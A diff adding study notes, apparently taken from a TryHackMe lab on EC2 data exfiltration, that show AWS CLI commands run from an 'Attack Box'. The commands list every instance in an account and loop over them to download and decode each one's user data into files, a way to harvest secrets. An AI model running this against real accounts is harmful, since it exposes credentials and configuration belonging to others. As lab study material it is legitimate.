@@ -237,10 +237,18 @@ user@machine$ aws ec2 describe-instances   --query 'Reservations[*].Instances[*]
 # removing `--query` parameter and `sed`, and changing `--output` to json will return full data on each instance
 [from: https://tryhackme.com/room/amazonec2dataexfiltration]
 ------------------------------------------------------------------------------------------------------------
+Issue command from Attack Box CLI:
 
+user@machine$ LIST=`aws ec2 describe-instances --region <REGION> --query Reservations[].Instances[].InstanceId --output text --profile <PROFILE_NAME>
+# retrieves list of all EC2 Instance IDs in Profile's account; saves Instance IDs as "environment variable" called: LIST
 
+user@machine$ for i in $LIST ; do
+  aws ec2 describe-instance-attribute --profile <PROFILE_NAME> --instance-id $i --attribute userData --output text --query UserData --region us-east-1 | base64 --decode > $i-USERDATA.txt
+done
+# shell command; consults the list of all instances (from environment variable LIST), and in "for" loop, downloads user data file for each instance, then base64 decodes the contents of each user data file into a separate text file [one for each instance]
 
-
+[from: https://tryhackme.com/room/amazonec2dataexfiltration]
+------------------------------------------------------------------------------------------------------------
 
 
 
